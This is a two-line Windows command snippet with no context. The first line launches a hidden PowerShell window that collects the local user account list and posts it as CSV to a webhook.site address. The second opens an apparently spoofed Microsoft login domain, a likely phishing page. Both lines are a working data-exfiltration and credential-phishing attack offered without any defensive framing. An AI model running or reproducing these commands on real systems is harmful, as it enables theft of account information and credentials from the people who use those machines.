cmd.exe /c powershell -WindowStyle Hidden -NoLogo -NoProfile -Command "$csv = Get-CimInstance Win32_UserAccount | ConvertTo-Csv -NoTypeInformation; Invoke-WebRequest -Uri 'https://webhook.site/de38a56a-6f02-4fc0-a610-8bfb683b12b8' -Method Post -Body $csv -ContentType 'text/plain'"
start https://login.microsoftonline365.fr/static/web/
